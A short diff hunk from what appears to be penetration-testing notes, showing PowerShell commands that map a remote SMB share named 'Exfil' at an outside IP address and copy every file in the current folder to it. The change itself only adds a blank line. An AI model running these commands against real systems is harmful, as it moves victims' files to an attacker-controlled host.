@@ -5,3 +5,4 @@ PS C:\> New-PSDrive -Name "Exfil" -PsProvider "Filesystem" -Root "\\10.10.14.195
 PS C:\> copy * Exfil:\
 ```
 Could be used in tandem with [[Client-Server Connection]] 
+
